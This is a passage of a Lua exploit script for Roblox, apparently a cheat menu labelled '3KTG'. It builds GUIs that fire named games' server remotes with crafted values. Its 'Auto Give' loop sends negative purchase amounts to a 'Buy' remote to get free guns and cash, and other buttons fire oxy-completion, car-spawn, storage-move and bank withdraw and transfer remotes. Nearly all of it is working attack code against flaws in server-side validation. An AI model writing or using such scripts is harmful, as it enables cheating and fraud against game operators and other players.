frame.Size = UDim2.new(0, 180, 0, 100)
frame.Position = UDim2.new(0.5, -90, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "Auto Refresh"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

-- Refresh Button
local refreshButton = Instance.new("TextButton")
refreshButton.Size = UDim2.new(0.8, 0, 0.4, 0)
refreshButton.Position = UDim2.new(0.1, 0, 0.45, 0)
refreshButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
refreshButton.Text = "Refresh"
refreshButton.TextColor3 = Color3.fromRGB(255, 255, 255)
refreshButton.Font = Enum.Font.Gotham
refreshButton.TextSize = 16
refreshButton.Parent = frame

-- Button rounded
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = refreshButton

-- Hover effect
refreshButton.MouseEnter:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
end)

refreshButton.MouseLeave:Connect(function()
    refreshButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)

-- Button Function
refreshButton.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Boy"
    }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC AUTO OXY [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

--// ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoOxyGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 120)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- ultra black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

--// Rounded corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 15)
uiCorner.Parent = frame

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

--// Button
local oxyButton = Instance.new("TextButton")
oxyButton.Size = UDim2.new(0, 200, 0, 50)
oxyButton.Position = UDim2.new(0.5, -100, 0, 60)
oxyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- full black
oxyButton.Text = "OXY"
oxyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
oxyButton.Font = Enum.Font.GothamBold
oxyButton.TextSize = 20
oxyButton.Parent = frame

--// Button rounded corners
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH WAYPOINT [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Variables
local savedWaypoint = nil

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "WaypointGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 170)
frame.Position = UDim2.new(0.5, -100, 0.5, -85)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.Text = "AUTO WAYPOINT"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Function to create buttons easily
local function createButton(text, order)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 35)
    button.Position = UDim2.new(0.1, 0, 0, 40 + (order * 40))
    button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Text = text
    button.Font = Enum.Font.Gotham
    button.TextSize = 16

    local btnCorner = Instance.new("UICorner", button)
    btnCorner.CornerRadius = UDim.new(0, 10)
    button.Parent = frame
    return button
end

-- Create Buttons
local setWaypointBtn = createButton("Set Waypoint", 0)
local refreshBtn = createButton("Refresh", 1)
local deleteWaypointBtn = createButton("Delete Waypoint", 2)

--// BUTTON FUNCTIONS

-- SET WAYPOINT
setWaypointBtn.MouseButton1Click:Connect(function()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        savedWaypoint = hrp.Position
        player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
            Title = "Waypoint Set",
            Text = "Respawn point saved!",
            Duration = 2
        })
    end
end)

-- REFRESH BUTTON (fires SaveCharacterEvent)
refreshBtn.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Boy";
    }
    ReplicatedStorage:WaitForChild("SaveCharacterEvent", 9e9):FireServer(unpack(args))
end)

-- DELETE WAYPOINT
deleteWaypointBtn.MouseButton1Click:Connect(function()
    savedWaypoint = nil
    player:WaitForChild("PlayerGui"):SetCore("SendNotification", {
        Title = "Waypoint Deleted",
        Text = "Respawn point removed!",
        Duration = 2
    })
end)

--// RESPAWN HANDLER
player.CharacterAdded:Connect(function(char)
    if savedWaypoint then
        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(savedWaypoint)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAVITE ROLEPLAY SPAWN GUN BM [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "CAVITE ROLEPLAY BM"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Tactical Knife", "Skorpion", "Heavy Vest", "Heavy Helmet", "MEDKIT", "-"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox")

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (TAONG GOMA CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- üß† NEW SYSTEM (replaces old Purchase event)
local giving = false
toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"

    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            local args = {
                [1] = tonumber(amountBox.Text),
                [2] = selectedGun
            }
            game:GetService("ReplicatedStorage"):WaitForChild("BM_Storage", 9e9)
                :WaitForChild("Remotes", 9e9)
                :WaitForChild("Buy", 9e9)
                :FireServer(unpack(args))
        end
        task.wait(1)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SPAWN EVOX DOMINION [3KTG]", function()
	local args = {
    [1] = "EvoX";
    [2] = "Garage_5";
}

game:GetService("ReplicatedStorage"):WaitForChild("CarSystem", 9e9):WaitForChild("Remotes", 9e9):WaitForChild("SpawnCar", 9e9):InvokeServer(unpack(args))
end)

--// 8 Buttons in Main Menu
addMainMenuButton("DOMINION STORAGE SYSTEM MOVE [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Helper: find remotes
local function getRemotes()
    local aaron = ReplicatedStorage:FindFirstChild("Aaron")
    if not aaron then return nil end
    local shared = aaron:FindFirstChild("Shared")
    if not shared then return nil end
    return shared:FindFirstChild("Remotes")
end

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoveGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame (ALL BLACK, Rounded, Draggable)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 200)
frame.Position = UDim2.new(0.5, -180, 0.3, -100)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 16)
frameCorner.Parent = frame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleBarCorner = Instance.new("UICorner")
titleBarCorner.CornerRadius = UDim.new(0, 16)
titleBarCorner.Parent = titleBar

-- Centered Title: TAONG GOMA
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -50, 1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "TAONG GOMA"
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = titleBar

-- Close Button (X) - WHITE
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 36, 0, 36)
closeButton.Position = UDim2.new(1, -40, 0, 2)
closeButton.BackgroundTransparency = 1
closeButton.Text = "‚úï"
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Parent = titleBar

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Draggable Logic
local dragging = false
local dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        updateInput(input)
    end
end)

-- Mode Button (CENTERED, BLACK + WHITE)
local mode = "Inventory"
local modeButton = Instance.new("TextButton")
modeButton.Size = UDim2.new(0, 160, 0, 32)
modeButton.Position = UDim2.new(0.5, -80, 0, 52)
modeButton.Text = "Mode: "..mode
modeButton.Font = Enum.Font.GothamBold
modeButton.TextSize = 16
modeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
modeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
modeButton.BorderSizePixel = 1
modeButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
modeButton.Parent = frame

local modeCorner = Instance.new("UICorner")
modeCorner.CornerRadius = UDim.new(0, 10)
modeCorner.Parent = modeButton

modeButton.MouseButton1Click:Connect(function()
    mode = (mode == "Inventory") and "Storage" or "Inventory"
    modeButton.Text = "Mode: "..mode
end)

-- Item Name Label & Box
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(0, 100, 0, 26)
nameLabel.Position = UDim2.new(0, 16, 0, 92)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = "Item name:"
nameLabel.Font = Enum.Font.Gotham
nameLabel.TextSize = 15
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.TextXAlignment = Enum.TextXAlignment.Left
nameLabel.Parent = frame

local nameBox = Instance.new("TextBox")
nameBox.Size = UDim2.new(0, 200, 0, 32)
nameBox.Position = UDim2.new(0, 120, 0, 89)
nameBox.PlaceholderText = "- SP - AK47"
nameBox.Text = ""
nameBox.ClearTextOnFocus = false
nameBox.Font = Enum.Font.Gotham
nameBox.TextSize = 15
nameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
nameBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nameBox.BorderSizePixel = 1
nameBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
nameBox.Parent = frame

local nameBoxCorner = Instance.new("UICorner")
nameBoxCorner.CornerRadius = UDim.new(0, 8)
nameBoxCorner.Parent = nameBox

-- Quantity Label & Box
local qtyLabel = Instance.new("TextLabel")
qtyLabel.Size = UDim2.new(0, 100, 0, 26)
qtyLabel.Position = UDim2.new(0, 16, 0, 130)
qtyLabel.BackgroundTransparency = 1
qtyLabel.Text = "Quantity:"
qtyLabel.Font = Enum.Font.Gotham
qtyLabel.TextSize = 15
qtyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
qtyLabel.TextXAlignment = Enum.TextXAlignment.Left
qtyLabel.Parent = frame

local qtyBox = Instance.new("TextBox")
qtyBox.Size = UDim2.new(0, 80, 0, 32)
qtyBox.Position = UDim2.new(0, 120, 0, 127)
qtyBox.PlaceholderText = "1"
qtyBox.Text = "1"
qtyBox.ClearTextOnFocus = false
qtyBox.Font = Enum.Font.Gotham
qtyBox.TextSize = 15
qtyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
qtyBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
qtyBox.BorderSizePixel = 1
qtyBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
qtyBox.Parent = frame

local qtyBoxCorner = Instance.new("UICorner")
qtyBoxCorner.CornerRadius = UDim.new(0, 8)
qtyBoxCorner.Parent = qtyBox

-- Move Button (CENTERED BELOW, BLACK + WHITE)
local moveButton = Instance.new("TextButton")
moveButton.Size = UDim2.new(0, 120, 0, 36)
moveButton.Position = UDim2.new(0.5, -60, 0, 155)
moveButton.Text = "Move"
moveButton.Font = Enum.Font.GothamBold
moveButton.TextSize = 16
moveButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
moveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
moveButton.BorderSizePixel = 1
moveButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
moveButton.Parent = frame

local moveCorner = Instance.new("UICorner")
moveCorner.CornerRadius = UDim.new(0, 10)
moveCorner.Parent = moveButton

-- Status Label (CENTERED BELOW BUTTON)
local status = Instance.new("TextLabel")
status.Size = UDim2.new(0, 310, 0, 24)
status.Position = UDim2.new(0, 25, 0, 170)
status.BackgroundTransparency = 1
status.Text = ""
status.TextSize = 14
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextXAlignment = Enum.TextXAlignment.Center
status.Visible = false
status.Parent = frame

-- Remote Function
local function callMoveRemote(targetMode, itemName, quantity)
    local remotes = getRemotes()
    if not remotes then return false, "Remotes not found" end
    local remoteName = (targetMode == "Inventory") and "MoveToInventory" or "MoveToStorage"
    local remote = remotes:FindFirstChild(remoteName)
    if not remote then return false, "Remote '"..remoteName.."' missing" end
    local ok, res = pcall(function()
        return remote:InvokeServer(itemName, quantity)
    end)
    return ok and true or false, ok and res or tostring(res)
end

-- Move Button Action
moveButton.MouseButton1Click:Connect(function()
    local item = nameBox.Text:gsub("^%s*(.-)%s*$", "%1")
    local q = tonumber(qtyBox.Text) or 0
    if item == "" or q <= 0 then
        status.Text = "Invalid input!"
        status.Visible = true
        task.delay(2, function() status.Visible = false end)
        return
    end
    status.Text = "Sending..."
    status.Visible = true
    local ok, res = callMoveRemote(mode, item, q)
    status.Text = ok and "Success!" or "Error: "..tostring(res)
    task.delay(2, function() status.Visible = false end)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FANTASY BANK GUI [3KTG]", function()
	local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- ScreenGui
local FantasyGUI = Instance.new("ScreenGui")
FantasyGUI.Name = "FantasyBank"
FantasyGUI.ResetOnSpawn = false
FantasyGUI.Parent = pgui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.3, -150)
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Parent = FantasyGUI

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 18)
FrameCorner.Parent = MainFrame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.new(0, 0, 0)
FrameStroke.Thickness = 2
FrameStroke.Parent = MainFrame

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 45)
TitleBar.BackgroundColor3 = Color3.new(0, 0, 0)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 18)
TitleBarCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "F A N T A S Y"
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextSize = 24
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 36, 0, 36)
CloseBtn.Position = UDim2.new(1, -40, 0, 4)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 20
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function()
    FantasyGUI:Destroy()
end)

-- Dragging
local dragging, dragInput, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then updateInput(input) end
end)

-- Amount
local AmountLabel = Instance.new("TextLabel")
AmountLabel.Size = UDim2.new(0, 100, 0, 30)
AmountLabel.Position = UDim2.new(0, 30, 0, 60)
AmountLabel.BackgroundTransparency = 1
AmountLabel.Text = "Amount:"
AmountLabel.Font = Enum.Font.Gotham
AmountLabel.TextSize = 16
AmountLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
AmountLabel.Parent = MainFrame

local AmountBox = Instance.new("TextBox")
AmountBox.Size = UDim2.new(0, 200, 0, 36)
AmountBox.Position = UDim2.new(0, 130, 0, 57)
AmountBox.PlaceholderText = "Amount"
AmountBox.Text = ""
AmountBox.ClearTextOnFocus = true
AmountBox.Font = Enum.Font.Gotham
AmountBox.TextSize = 16
AmountBox.TextColor3 = Color3.fromRGB(255, 255, 255)
AmountBox.BackgroundColor3 = Color3.new(0, 0, 0)
AmountBox.BorderSizePixel = 1
AmountBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
AmountBox.Parent = MainFrame

local AmountCorner = Instance.new("UICorner")
AmountCorner.CornerRadius = UDim.new(0, 10)
AmountCorner.Parent = AmountBox

-- ID
local IDLabel = Instance.new("TextLabel")
IDLabel.Size = UDim2.new(0, 100, 0, 30)
IDLabel.Position = UDim2.new(0, 30, 0, 100)
IDLabel.BackgroundTransparency = 1
IDLabel.Text = "ID:"
IDLabel.Font = Enum.Font.Gotham
IDLabel.TextSize = 16
IDLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
IDLabel.Parent = MainFrame

local IDBox = Instance.new("TextBox")
IDBox.Size = UDim2.new(0, 200, 0, 36)
IDBox.Position = UDim2.new(0, 130, 0, 97)
IDBox.PlaceholderText = "ID"
IDBox.Text = ""
IDBox.ClearTextOnFocus = true
IDBox.Font = Enum.Font.Gotham
IDBox.TextSize = 16
IDBox.TextColor3 = Color3.fromRGB(255, 255, 255)
IDBox.BackgroundColor3 = Color3.new(0, 0, 0)
IDBox.BorderSizePixel = 1
IDBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
IDBox.Parent = MainFrame

local IDCorner = Instance.new("UICorner")
IDCorner.CornerRadius = UDim.new(0, 10)
IDCorner.Parent = IDBox

-- Modes
local modes = {"WITHDRAW", "DEPOSIT", "TRANSFER"}
local currentMode = "WITHDRAW"
local modeButtons = {}

for i, mode in ipairs(modes) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 38)
    btn.Position = UDim2.new(0, 30 + (i-1)*110, 0, 145)
    btn.BackgroundColor3 = Color3.new(0, 0, 0)
    btn.Text = mode
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 15
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(255, 255, 255)
    btn.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        currentMode = mode
        for _, b in ipairs(modeButtons) do
            TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(0, 0, 0)}):Play()
        end
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
        IDLabel.Visible = (mode == "TRANSFER")
        IDBox.Visible = (mode == "TRANSFER")
    end)

    table.insert(modeButtons, btn)
    if i == 1 then
        TweenService:Create(btn, TweenInfo.new(0), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
    end
end

-- Execute
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Size = UDim2.new(0, 300, 0, 45)
ExecuteBtn.Position = UDim2.new(0.5, -150, 0, 200)
ExecuteBtn.BackgroundColor3 = Color3.new(0, 0, 0)
ExecuteBtn.Text = "EXECUTE"
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 18
ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.BorderSizePixel = 2
ExecuteBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
ExecuteBtn.Parent = MainFrame

local ExecCorner = Instance.new("UICorner")
ExecCorner.CornerRadius = UDim.new(0, 12)
ExecCorner.Parent = ExecuteBtn

ExecuteBtn.MouseButton1Click:Connect(function()
    local amount = tonumber(AmountBox.Text) or 0
    local args

    if currentMode == "WITHDRAW" then
        args = {"Withdraw", amount}
    elseif currentMode == "DEPOSIT" then
        args = {"Deposit", amount}
    elseif currentMode == "TRANSFER" then
        local targetId = tonumber(IDBox.Text) or 0
        args = {"Transfer", amount, targetId}
    end

    pcall(function()
        game:GetService("ReplicatedStorage")
        :WaitForChild("RemoteEvents", 9e9)
        :WaitForChild("Bank", 9e9)
        :FireServer(unpack(args))
    end)

    AmountBox.Text = ""
    IDBox.Text = ""

    task.wait(0.1)
    for _, b in ipairs(modeButtons) do
        TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(0, 0, 0)}):Play()
    end
    TweenService:Create(modeButtons[1], TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
    currentMode = "WITHDRAW"
    IDLabel.Visible = false
    IDBox.Visible = false
end)

-- Glow
local Glow = Instance.new("ImageLabel")
Glow.Size = UDim2.new(1, 60, 1, 60)
Glow.Position = UDim2.new(0, -30, 0, -30)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://2415002530"
Glow.ImageColor3 = Color3.fromRGB(30, 30, 30)
Glow.ImageTransparency = 0.8
Glow.ScaleType = Enum.ScaleType.Slice
